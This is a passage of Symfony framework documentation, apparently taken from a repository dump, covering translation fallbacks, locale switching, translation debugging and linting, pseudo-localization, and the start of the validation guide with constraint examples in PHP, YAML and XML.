Symfony looks for the translation in a ``es_AR`` (Argentinean\n   Spanish) translation resource (e.g. ``messages.es_AR.yaml``);\n\n#. If it wasn't found, Symfony looks for the translation in the\n   parent locale, which is automatically defined only for some locales. In\n   this example, the parent locale is ``es_419`` (Latin American Spanish);\n\n#. If it wasn't found, Symfony looks for the translation in a ``es``\n   (Spanish) translation resource (e.g. ``messages.es.yaml``);\n\n#. If the translation still isn't found, Symfony uses the ``fallbacks`` option,\n   which can be configured as follows. When this option is not defined, it\n   defaults to the ``default_locale`` setting mentioned in the previous section.\n\n   .. configuration-block::\n\n       .. code-block:: yaml\n\n           # config/packages/translation.yaml\n           framework:\n               translator:\n                   fallbacks: ['en']\n                   # ...\n\n       .. code-block:: xml\n\n           <!-- config/packages/translation.xml -->\n           <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n           <container xmlns=\"http://symfony.com/schema/dic/services\"\n               xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n               xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n               xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                   https://symfony.com/schema/dic/services/services-1.0.xsd\n                   http://symfony.com/schema/dic/symfony\n                   https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n               <framework:config>\n                   <framework:translator>\n                       <framework:fallback>en</framework:fallback>\n                       <!-- ... -->\n                   </framework:translator>\n               </framework:config>\n           </container>\n\n       .. code-block:: php\n\n           // config/packages/translation.php\n           use Symfony\\Config\\FrameworkConfig;\n\n            return static function (FrameworkConfig $framework): void {\n                // ...\n                $framework->translator()\n                    ->fallbacks(['en'])\n                ;\n            };\n\n.. note::\n\n    When Symfony can't find a translation in the given locale, it will\n    add the missing translation to the log file. For details,\n    see :ref:`reference-framework-translator-logging`.\n\n.. _locale-switcher:\n\nSwitch Locale Programmatically\n------------------------------\n\nSometimes you need to change the locale of the application dynamically\njust to run some code. Imagine a console command that renders Twig templates\nof emails in different languages. You need to change the locale only to\nrender those templates.\n\nThe ``LocaleSwitcher`` class allows you to change at once the locale\nof:\n\n* All the services that are tagged with ``kernel.locale_aware``;\n* ``\\Locale::setDefault()``;\n* If the ``RequestContext`` service is available, the ``_locale``\n  parameter (so urls are generated with the new locale)::\n\n    use Symfony\\Component\\Translation\\LocaleSwitcher;\n\n    class SomeService\n    {\n        public function __construct(\n            private LocaleSwitcher $localeSwitcher,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            // you can get the current application locale like this:\n            $currentLocale = $this->localeSwitcher->getLocale();\n\n            // you can set the locale for the entire application like this:\n            // (from now on, the application will use 'fr' (French) as the\n            // locale; including the default locale used to translate Twig templates)\n            $this->localeSwitcher->setLocale('fr');\n\n            // reset the current locale of your application to the configured default locale\n            // in config/packages/translation.yaml, by option 'default_locale'\n            $this->localeSwitcher->reset();\n\n            // you can also run some code with a certain locale, without\n            // changing the locale for the rest of the application\n            $this->localeSwitcher->runWithLocale('es', function() {\n\n                // e.g. render here some Twig templates using 'es' (Spanish) locale\n\n            });\n\n            // you can optionally declare an argument in your callback to receive the\n            // injected locale\n            $this->localeSwitcher->runWithLocale('es', function(string $locale) {\n\n                // here, the $locale argument will be set to 'es'\n\n            });\n\n            // ...\n        }\n    }\n\nWhen using :ref:`autowiring <services-autowire>`, type-hint any controller or\nservice argument with the :class:`Symfony\\\\Component\\\\Translation\\\\LocaleSwitcher`\nclass to inject the locale switcher service. Otherwise, configure your services\nmanually and inject the ``translation.locale_switcher`` service.\n\n.. _translation-debug:\n\nHow to Find Missing or Unused Translation Messages\n--------------------------------------------------\n\nWhen you work with many translation messages in different languages, it can be\nhard to keep track which translations are missing and which are not used\nanymore. The ``debug:translation`` command helps you to find these missing or\nunused translation messages templates:\n\n.. code-block:: twig\n\n    {# messages can be found when using the trans filter and tag #}\n    {% trans %}Symfony is great{% endtrans %}\n\n    {{ 'Symfony is great'|trans }}\n\n.. warning::\n\n    The extractors can't find messages translated outside templates (like form\n    labels or controllers) unless using :ref:`translatable objects\n    <translatable-objects>` or calling the ``trans()`` method on a translator\n    (since Symfony 5.3). Dynamic translations using variables or expressions in\n    templates are not detected either:\n\n    .. code-block:: twig\n\n        {# this translation uses a Twig variable, so it won't be detected #}\n        {% set message = 'Symfony is great' %}\n        {{ message|trans }}\n\nSuppose your application's default_locale is ``fr`` and you have configured\n``en`` as the fallback locale (see :ref:`configuration\n<translation-configuration>` and :ref:`fallback <translation-fallback>` for\nhow to configure these). And suppose you've already set up some translations\nfor the ``fr`` locale:\n\n.. configuration-block::\n\n    .. code-block:: xml\n\n        <!-- translations/messages.fr.xlf -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <xliff version=\"1.2\" xmlns=\"urn:oasis:names:tc:xliff:document:1.2\">\n            <file source-language=\"en\" datatype=\"plaintext\" original=\"file.ext\">\n                <body>\n                    <trans-unit id=\"1\">\n                        <source>Symfony is great</source>\n                        <target>J'aime Symfony</target>\n                    </trans-unit>\n                </body>\n            </file>\n        </xliff>\n\n    .. code-block:: yaml\n\n        # translations/messages.fr.yaml\n        Symfony is great: J'aime Symfony\n\n    .. code-block:: php\n\n        // translations/messages.fr.php\n        return [\n            'Symfony is great' => 'J\\'aime Symfony',\n        ];\n\nand for the ``en`` locale:\n\n.. configuration-block::\n\n    .. code-block:: xml\n\n        <!-- translations/messages.en.xlf -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <xliff version=\"1.2\" xmlns=\"urn:oasis:names:tc:xliff:document:1.2\">\n            <file source-language=\"en\" datatype=\"plaintext\" original=\"file.ext\">\n                <body>\n                    <trans-unit id=\"1\">\n                        <source>Symfony is great</source>\n                        <target>Symfony is great</target>\n                    </trans-unit>\n                </body>\n            </file>\n        </xliff>\n\n    .. code-block:: yaml\n\n        # translations/messages.en.yaml\n        Symfony is great: Symfony is great\n\n    .. code-block:: php\n\n        // translations/messages.en.php\n        return [\n            'Symfony is great' => 'Symfony is great',\n        ];\n\nTo inspect all messages in the ``fr`` locale for the application, run:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:translation fr\n\n    ---------  ------------------  ----------------------  -------------------------------\n     State      Id                  Message Preview (fr)    Fallback Message Preview (en)\n    ---------  ------------------  ----------------------  -------------------------------\n     unused     Symfony is great    J'aime Symfony          Symfony is great\n    ---------  ------------------  ----------------------  -------------------------------\n\nIt shows you a table with the result when translating the message in the ``fr``\nlocale and the result when the fallback locale ``en`` would be used. On top\nof that, it will also show you when the translation is the same as the fallback\ntranslation (this could indicate that the message was not correctly translated).\nFurthermore, it indicates that the message ``Symfony is great`` is unused\nbecause it is translated, but you haven't used it anywhere yet.\n\nNow, if you translate the message in one of your templates, you will get this\noutput:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:translation fr\n\n    ---------  ------------------  ----------------------  -------------------------------\n     State      Id                  Message Preview (fr)    Fallback Message Preview (en)\n    ---------  ------------------  ----------------------  -------------------------------\n                Symfony is great    J'aime Symfony          Symfony is great\n    ---------  ------------------  ----------------------  -------------------------------\n\nThe state is empty which means the message is translated in the ``fr`` locale\nand used in one or more templates.\n\nIf you delete the message ``Symfony is great`` from your translation file\nfor the ``fr`` locale and run the command, you will get:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:translation fr\n\n    ---------  ------------------  ----------------------  -------------------------------\n     State      Id                  Message Preview (fr)    Fallback Message Preview (en)\n    ---------  ------------------  ----------------------  -------------------------------\n     missing    Symfony is great    Symfony is great        Symfony is great\n    ---------  ------------------  ----------------------  -------------------------------\n\nThe state indicates the message is missing because it is not translated in\nthe ``fr`` locale but it is still used in the template. Moreover, the message\nin the ``fr`` locale equals to the message in the ``en`` locale. This is a\nspecial case because the untranslated message id equals its translation in\nthe ``en`` locale.\n\nIf you copy the content of the translation file in the ``en`` locale to the\ntranslation file in the ``fr`` locale and run the command, you will get:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:translation fr\n\n    ----------  ------------------  ----------------------  -------------------------------\n     State       Id                  Message Preview (fr)    Fallback Message Preview (en)\n    ----------  ------------------  ----------------------  -------------------------------\n     fallback    Symfony is great    Symfony is great        Symfony is great\n    ----------  ------------------  ----------------------  -------------------------------\n\nYou can see that the translations of the message are identical in the ``fr``\nand ``en`` locales which means this message was probably copied from English\nto French and maybe you forgot to translate it.\n\nBy default, all domains are inspected, but it is possible to specify a single\ndomain:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:translation en --domain=messages\n\nWhen the application has a lot of messages, it is useful to display only the\nunused or only the missing messages, by using the ``--only-unused`` or\n``--only-missing`` options:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:translation en --only-unused\n    $ php bin/console debug:translation en --only-missing\n\nDebug Command Exit Codes\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe exit code of the ``debug:translation`` command changes depending on the\nstatus of the translations. Use the following public constants to check it::\n\n    use Symfony\\Bundle\\FrameworkBundle\\Command\\TranslationDebugCommand;\n\n    // generic failure (e.g. there are no translations)\n    TranslationDebugCommand::EXIT_CODE_GENERAL_ERROR;\n\n    // there are missing translations\n    TranslationDebugCommand::EXIT_CODE_MISSING;\n\n    // there are unused translations\n    TranslationDebugCommand::EXIT_CODE_UNUSED;\n\n    // some translations are using the fallback translation\n    TranslationDebugCommand::EXIT_CODE_FALLBACK;\n\nThese constants are defined as \"bit masks\", so you can combine them as follows::\n\n    if (TranslationDebugCommand::EXIT_CODE_MISSING | TranslationDebugCommand::EXIT_CODE_UNUSED) {\n        // ... there are missing and/or unused translations\n    }\n\n.. _translation-lint:\n\nHow to Find Errors in Translation Files\n---------------------------------------\n\nSymfony processes all the application translation files as part of the process\nthat compiles the application code before executing it. If there's an error in\nany translation file, you'll see an error message explaining the problem.\n\nIf you prefer, you can also validate the contents of any YAML and XLIFF\ntranslation file using the ``lint:yaml`` and ``lint:xliff`` commands:\n\n.. code-block:: terminal\n\n    # lint a single file\n    $ php bin/console lint:yaml translations/messages.en.yaml\n    $ php bin/console lint:xliff translations/messages.en.xlf\n\n    # lint a whole directory\n    $ php bin/console lint:yaml translations\n    $ php bin/console lint:xliff translations\n\n    # lint multiple files or directories\n    $ php bin/console lint:yaml translations path/to/trans\n    $ php bin/console lint:xliff translations/messages.en.xlf translations/messages.es.xlf\n\nThe linter results can be exported to JSON using the ``--format`` option:\n\n.. code-block:: terminal\n\n    $ php bin/console lint:yaml translations/ --format=json\n    $ php bin/console lint:xliff translations/ --format=json\n\nWhen running these linters inside `GitHub Actions`_, the output is automatically\nadapted to the format required by GitHub, but you can force that format too:\n\n.. code-block:: terminal\n\n    $ php bin/console lint:yaml translations/ --format=github\n    $ php bin/console lint:xliff translations/ --format=github\n\n.. tip::\n\n    The Yaml component provides a stand-alone ``yaml-lint`` binary allowing\n    you to lint YAML files without having to create a console application:\n\n    .. code-block:: terminal\n\n        $ php vendor/bin/yaml-lint translations/\n\nPseudo-localization translator\n------------------------------\n\n.. note::\n\n    The pseudolocalization translator is meant to be used for development only.\n\nThe following image shows a typical menu on a webpage:\n\n.. image:: /_images/translation/pseudolocalization-interface-original.png\n    :alt: A menu showing multiple items nicely aligned next to eachother.\n\nThis other image shows the same menu when the user switches the language to\nSpanish. Unexpectedly, some text is cut and other contents are so long that\nthey overflow and you can't see them:\n\n.. image:: /_images/translation/pseudolocalization-interface-translated.png\n    :alt: In Spanish, some menu items contain more letters which result in them being cut.\n\nThese kind of errors are very common, because different languages can be longer\nor shorter than the original application language. Another common issue is to\nonly check if the application works when using basic accented letters, instead\nof checking for more complex characters such as the ones found in Polish,\nCzech, etc.\n\nThese problems can be solved with `pseudolocalization`_, a software testing method\nused for testing internationalization. In this method, instead of translating\nthe text of the software into a foreign language, the textual elements of an\napplication are replaced with an altered version of the original language.\n\nFor example, ``Account Settings`` is *translated* as ``[!!! Àççôûñţ\nŠéţţîñĝš !!!]``. First, the original text is expanded in length with characters\nlike ``[!!! !!!]`` to test the application when using languages more verbose\nthan the original one. This solves the first problem.\n\nIn addition, the original characters are replaced by similar but accented\ncharacters. This makes the text highly readable, while allowing to test the\napplication with all kinds of accented and special characters. This solves the\nsecond problem.\n\nFull support for pseudolocalization was added to help you debug\ninternationalization issues in your applications. You can enable and configure\nit in the translator configuration:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/translation.yaml\n        framework:\n            translator:\n                pseudo_localization:\n                    # replace characters by their accented version\n                    accents: true\n                    # wrap strings with brackets\n                    brackets: true\n                    # controls how many extra characters are added to make text longer\n                    expansion_factor: 1.4\n                    # maintain the original HTML tags of the translated contents\n                    parse_html: true\n                    # also translate the contents of these HTML attributes\n                    localizable_html_attributes: ['title']\n\n    .. code-block:: xml\n\n        <!-- config/packages/translation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:translator>\n                    <!-- accents: replace characters by their accented version -->\n                    <!-- brackets: wrap strings with brackets -->\n                    <!-- expansion_factor: controls how many extra characters are added to make text longer -->\n                    <!-- parse_html: maintain the original HTML tags of the translated contents -->\n                    <framework:pseudo-localization\n                        accents=\"true\"\n                        brackets=\"true\"\n                        expansion_factor=\"1.4\"\n                        parse_html=\"true\"\n                    >\n                        <!-- also translate the contents of these HTML attributes -->\n                        <framework:localizable-html-attribute>title</framework:localizable-html-attribute>\n                    </framework:pseudo-localization>\n                </framework:translator>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/translation.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework) {\n            // ...\n            $framework\n                ->translator()\n                    ->pseudoLocalization()\n                        // replace characters by their accented version\n                        ->accents(true)\n                        // wrap strings with brackets\n                        ->brackets(true)\n                        // controls how many extra characters are added to make text longer\n                        ->expansionFactor(1.4)\n                        // maintain the original HTML tags of the translated contents\n                        ->parseHtml(true)\n                        // also translate the contents of these HTML attributes\n                        ->localizableHtmlAttributes(['title'])\n            ;\n        };\n\nThat's all. The application will now start displaying those strange, but\nreadable, contents to help you internationalize it. See for example the\ndifference in the `Symfony Demo`_ application. This is the original page:\n\n.. image:: /_images/translation/pseudolocalization-symfony-demo-disabled.png\n    :alt: The Symfony demo login page.\n    :class: with-browser\n\nAnd this is the same page with pseudolocalization enabled:\n\n.. image:: /_images/translation/pseudolocalization-symfony-demo-enabled.png\n    :alt: The Symfony demo login page with pseudolocalization.\n    :class: with-browser\n\nSummary\n-------\n\nWith the Symfony Translation component, creating an internationalized application\nno longer needs to be a painful process and boils down to these steps:\n\n* Abstract messages in your application by wrapping each in the\n  :method:`Symfony\\\\Component\\\\Translation\\\\Translator::trans` method;\n\n* Translate each message into multiple locales by creating translation message\n  files. Symfony discovers and processes each file because its name follows\n  a specific convention;\n\n* Manage the user's locale, which is stored on the request, but can also\n  be set on the user's session.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n\n    reference/formats/message_format\n    reference/formats/xliff\n\n.. _`i18n`: https://en.wikipedia.org/wiki/Internationalization_and_localization\n.. _`ICU MessageFormat`: https://unicode-org.github.io/icu/userguide/format_parse/messages/\n.. _`ISO 3166-1 alpha-2`: https://en.wikipedia.org/wiki/ISO_3166-1#Current_codes\n.. _`ISO 639-1`: https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes\n.. _`Translatable Extension`: https://github.com/doctrine-extensions/DoctrineExtensions/blob/main/doc/translatable.md\n.. _`Translatable Behavior`: https://github.com/KnpLabs/DoctrineBehaviors\n.. _`Custom Language Name setting`: https://docs.lokalise.com/en/articles/1400492-uploading-files#custom-language-codes\n.. _`ICU resource bundle`: https://github.com/unicode-org/icu-docs/blob/main/design/bnf_rb.txt\n.. _`Portable object format`: https://www.gnu.org/software/gettext/manual/html_node/PO-Files.html\n.. _`Machine object format`: https://www.gnu.org/software/gettext/manual/html_node/MO-Files.html\n.. _`QT Translations TS XML`: https://doc.qt.io/qt-5/linguist-ts-file-format.html\n.. _`GitHub Actions`: https://docs.github.com/en/free-pro-team@latest/actions\n.. _`pseudolocalization`: https://en.wikipedia.org/wiki/Pseudolocalization\n.. _`Symfony Demo`: https://github.com/symfony/demo\n.. _`Crowdin Language Codes`: https://developer.crowdin.com/language-codes\n.. _`Custom Language Codes`: https://support.crowdin.com/project-settings/#languages\n.. _`Identification via User-Agent`: https://developers.phrase.com/api/#overview--identification-via-user-agent\n.. _`Phrase Tag Bundle`: https://github.com/wickedOne/phrase-tag-bundle\n.. _`Crowdin`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Translation/Bridge/Crowdin/README.md\n.. _`Loco (localise.biz)`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Translation/Bridge/Loco/README.md\n.. _`Lokalise`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Translation/Bridge/Lokalise/README.md\n.. _`Phrase`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Translation/Bridge/Phrase/README.md\n.. _`AST`: https://en.wikipedia.org/wiki/Abstract_syntax_tree\n"
        },
        {
          "name": "validation.rst",
          "type": "blob",
          "size": 24.4189453125,
          "content": "Validation\n==========\n\nValidation is a very common task in web applications. Data entered in forms\nneeds to be validated. Data also needs to be validated before it is written\ninto a database or passed to a web service.\n\nSymfony provides a `Validator`_ component to handle this for you. This\ncomponent is based on the `JSR303 Bean Validation specification`_.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the validator before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/validator\n\n.. note::\n\n    If your application doesn't use Symfony Flex, you might need to do some\n    manual configuration to enable validation. Check out the\n    :ref:`Validation configuration reference <reference-validation>`.\n\nThe Basics of Validation\n------------------------\n\nThe best way to understand validation is to see it in action. To start, suppose\nyou've created a plain-old-PHP object that you need to use somewhere in\nyour application::\n\n    // src/Entity/Author.php\n    namespace App\\Entity;\n\n    class Author\n    {\n        private string $name;\n    }\n\nSo far, this is an ordinary class that serves some purpose inside your\napplication. The goal of validation is to tell you if the data of an object is\nvalid. For this to work, you'll configure a list of rules (called\n:ref:`constraints <validation-constraints>`) that the object must follow in\norder to be valid. These rules are usually defined using PHP code or\nattributes but they can also be defined as ``.yaml`` or ``.xml`` files inside\nthe ``config/validator/`` directory:\n\nFor example, to indicate that the ``$name`` property must not be empty, add the\nfollowing:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n\n        class Author\n        {\n            #[Assert\\NotBlank]\n            private string $name;\n        }\n\n    .. code-block:: yaml\n\n        # config/validator/validation.yaml\n        App\\Entity\\Author:\n            properties:\n                name:\n                    - NotBlank: ~\n\n    .. code-block:: xml\n\n        <!-- config/validator/validation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <constraint-mapping xmlns=\"http://symfony.com/schema/dic/constraint-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/constraint-mapping\n                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd\">\n\n            <class name=\"App\\Entity\\Author\">\n                <property name=\"name\">\n                    <constraint name=\"NotBlank\"/>\n                </property>\n            </class>\n        </constraint-mapping>\n\n    .. code-block:: php\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n        // ...\n        use Symfony\\Component\\Validator\\Constraints\\NotBlank;\n        use Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\n        class Author\n        {\n            private string $name;\n\n            public static function loadValidatorMetadata(ClassMetadata $metadata): void\n            {\n                $metadata->addPropertyConstraint('name', new NotBlank());\n            }\n        }\n\nAdding this configuration by itself does not yet guarantee that the value will\nnot be blank; you can still set it to a blank value if you want.\nTo actually guarantee that the value adheres to the constraint, the object must\nbe passed to the validator service to be checked.\n\n.. tip::\n\n    Symfony's validator uses PHP reflection, as well as *\"getter\"* methods, to\n    get the value of any property, so they can be public, private or protected\n    (see :ref:`validator-constraint-targets`).\n\nUsing the Validator Service\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nNext, to actually validate an ``Author`` object, use the ``validate()`` method\non the ``validator`` service (which implements :class:`Symfony\\\\Component\\\\Validator\\\\Validator\\\\ValidatorInterface`).\nThe job of the ``validator`` is to read the constraints (i.e. rules)\nof a class and verify if the data on the object satisfies those\nconstraints. If validation fails, a non-empty list of errors\n(:class:`Symfony\\\\Component\\\\Validator\\\\ConstraintViolationList` class) is\nreturned. Take this simple example from inside a controller::\n\n    // ...\n    use App\\Entity\\Author;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Validator\\Validator\\ValidatorInterface;\n\n    // ...\n    public function author(ValidatorInterface $validator): Response\n    {\n        $author = new Author();\n\n        // ... do something to the $author object\n\n        $errors = $validator->validate($author);\n\n        if (count($errors) > 0) {\n            /*\n             * Uses a __toString method on the $errors variable which is a\n             * ConstraintViolationList object. This gives us a nice string\n             * for debugging.\n             */\n            $errorsString = (string) $errors;\n\n            return new Response($errorsString);\n        }\n\n        return new Response('The author is valid! Yes!');\n    }\n\nIf the ``$name`` property is empty, you will see the following error\nmessage:\n\n.. code-block:: text\n\n    Object(App\\Entity\\Author).name:\n        This value should not be blank.\n\nIf you insert a value into the ``name`` property, the happy success message\nwill appear.\n\n.. tip::\n\n    Most of the time, you won't interact directly with the ``validator``\n    service or need to worry about printing out the errors. Most of the time,\n    you'll use validation indirectly when handling submitted form data. For\n    more information, see :ref:`how to validate Symfony forms <validating-forms>`.\n\nYou could also pass the collection of errors into a template::\n\n    if (count($errors) > 0) {\n        return $this->render('author/validation.html.twig', [\n            'errors' => $errors,\n        ]);\n    }\n\nInside the template, you can output the list of errors exactly as needed:\n\n.. code-block:: html+twig\n\n    {# templates/author/validation.html.twig #}\n    <h3>The author has the following errors</h3>\n    <ul>\n    {% for error in errors %}\n        <li>{{ error.message }}</li>\n    {% endfor %}\n    </ul>\n\n.. note::\n\n    Each validation error (called a \"constraint violation\"), is represented by\n    a :class:`Symfony\\\\Component\\\\Validator\\\\ConstraintViolation` object. This\n    object allows you, among other things, to get the constraint that caused this\n    violation thanks to the ``ConstraintViolation::getConstraint()`` method.\n\nValidation Callables\n~~~~~~~~~~~~~~~~~~~~\n\nThe ``Validation`` also allows you to create a closure to validate values\nagainst a set of constraints (useful for example when\n:ref:`validating Console command answers <console-validate-question-answer>` or\nwhen :ref:`validating OptionsResolver values <optionsresolver-validate-value>`):\n\n:method:`Symfony\\\\Component\\\\Validator\\\\Validation::createCallable`\n    This returns a closure that throws ``ValidationFailedException`` when the\n    constraints aren't matched.\n:method:`Symfony\\\\Component\\\\Validator\\\\Validation::createIsValidCallable`\n    This returns a closure that returns ``false`` when the constraints aren't matched.\n\n.. _validation-constraints:\n\nConstraints\n-----------\n\nThe ``validator`` is designed to validate objects against *constraints* (i.e.\nrules). In order to validate an object, simply map one or more constraints\nto its class and then pass it to the ``validator`` service.\n\nBehind the scenes, a constraint is simply a PHP object that makes an assertive\nstatement. In real life, a constraint could be: ``'The cake must not be burned'``.\nIn Symfony, constraints are similar: they are assertions that a condition\nis true. Given a value, a constraint will tell you if that value\nadheres to the rules of the constraint.\n\nSupported Constraints\n~~~~~~~~~~~~~~~~~~~~~\n\nSymfony packages many of the most commonly-needed constraints:\n\n.. include:: /reference/constraints/map.rst.inc\n\nYou can also create your own custom constraints. This topic is covered in\nthe :doc:`/validation/custom_constraint` article.\n\n.. _validation-constraint-configuration:\n\nConstraint Configuration\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nSome constraints, like :doc:`NotBlank </reference/constraints/NotBlank>`,\nare simple whereas others, like the :doc:`Choice </reference/constraints/Choice>`\nconstraint, have several configuration options available. Suppose that the\n``Author`` class has another property called ``genre`` that defines the\nliterature genre mostly associated with the author, which can be set to either\n\"fiction\" or \"non-fiction\":\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n\n        class Author\n        {\n            #[Assert\\Choice(\n                choices: ['fiction', 'non-fiction'],\n                message: 'Choose a valid genre.',\n            )]\n            private string $genre;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/validator/validation.yaml\n        App\\Entity\\Author:\n            properties:\n                genre:\n                    - Choice: { choices: [fiction, non-fiction], message: Choose a valid genre. }\n                # ...\n\n    .. code-block:: xml\n\n        <!-- config/validator/validation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <constraint-mapping xmlns=\"http://symfony.com/schema/dic/constraint-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/constraint-mapping\n                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd\">\n\n            <class name=\"App\\Entity\\Author\">\n                <property name=\"genre\">\n                    <constraint name=\"Choice\">\n                        <option name=\"choices\">\n                            <value>fiction</value>\n                            <value>non-fiction</value>\n                        </option>\n                        <option name=\"message\">Choose a valid genre.</option>\n                    </constraint>\n                </property>\n\n                <!-- ... -->\n            </class>\n        </constraint-mapping>\n\n    .. code-block:: php\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n        use Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\n        class Author\n        {\n            private string $genre;\n\n            // ...\n\n            public static function loadValidatorMetadata(ClassMetadata $metadata): void\n            {\n                // ...\n\n                $metadata->addPropertyConstraint('genre', new Assert\\Choice([\n                    'choices' => ['fiction', 'non-fiction'],\n                    'message' => 'Choose a valid genre.',\n                ]));\n            }\n        }\n\n.. _validation-default-option:\n\nThe options of a constraint can always be passed in as an array. Some constraints,\nhowever, also allow you to pass the value of one, \"*default*\", option in place\nof the array. In the case of the ``Choice`` constraint, the ``choices``\noptions can be specified in this way.\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n\n        class Author\n        {\n            #[Assert\\Choice(['fiction', 'non-fiction'])]\n            private string $genre;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/validator/validation.yaml\n        App\\Entity\\Author:\n            properties:\n                genre:\n                    - Choice: [fiction, non-fiction]\n                # ...\n\n    .. code-block:: xml\n\n        <!-- config/validator/validation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <constraint-mapping xmlns=\"http://symfony.com/schema/dic/constraint-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/constraint-mapping\n                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd\">\n\n            <class name=\"App\\Entity\\Author\">\n                <property name=\"genre\">\n                    <constraint name=\"Choice\">\n                        <value>fiction</value>\n                        <value>non-fiction</value>\n                    </constraint>\n                </property>\n\n                <!-- ... -->\n            </class>\n        </constraint-mapping>\n\n    .. code-block:: php\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n        use Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\n        class Author\n        {\n            private string $genre;\n\n            public static function loadValidatorMetadata(ClassMetadata $metadata): void\n            {\n                // ...\n\n                $metadata->addPropertyConstraint(\n                    'genre',\n                    new Assert\\Choice(['fiction', 'non-fiction'])\n                );\n            }\n        }\n\nThis is purely meant to make the configuration of the most common option of\na constraint shorter and quicker.\n\nIf you're ever unsure of how to specify an option, either check the namespace\n``Symfony\\Component\\Validator\\Constraints`` for the constraint or play it safe\nby always passing in an array of options (the first method shown above).\n\nConstraints in Form Classes\n---------------------------\n\nConstraints can be defined while building the form via the ``constraints`` option\nof the form fields::\n\n    public function buildForm(FormBuilderInterface $builder, array $options): void\n    {\n        $builder\n            ->add('myField', TextType::class, [\n                'required' => true,\n                'constraints' => [new Length(['min' => 3])],\n            ])\n        ;\n    }\n\n.. _validator-constraint-targets:\n\nConstraint Targets\n------------------\n\nConstraints can be applied to a class property (e.g. ``name``),\na getter method (e.g. ``getFullName()``) or an entire class. Property constraints\nare the most common and easy to use. Getter constraints allow you to specify\nmore complex validation rules. Finally, class constraints are intended\nfor scenarios where you want to validate a class as a whole.\n\n.. _validation-property-target:\n\nProperties\n~~~~~~~~~~\n\nValidating class properties is the most basic validation technique. Symfony\nallows you to validate private, protected or public properties. The next\nlisting shows you how to configure the ``$firstName`` property of an ``Author``\nclass to have at least 3 characters.\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Entity/Author.php\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n\n        class Author\n        {\n            #[Assert\\NotBlank]\n            #[Assert\\Length(min: 3)]\n            private string $firstName;\n        }\n\n    .. code-block:: yaml\n\n        # config/validator/validation.yaml\n        App\\Entity\\Author:\n            properties:\n                firstName:\n                    - NotBlank: ~\n                    - Length:\n                        min: 3\n\n    .. code-block:: xml\n\n        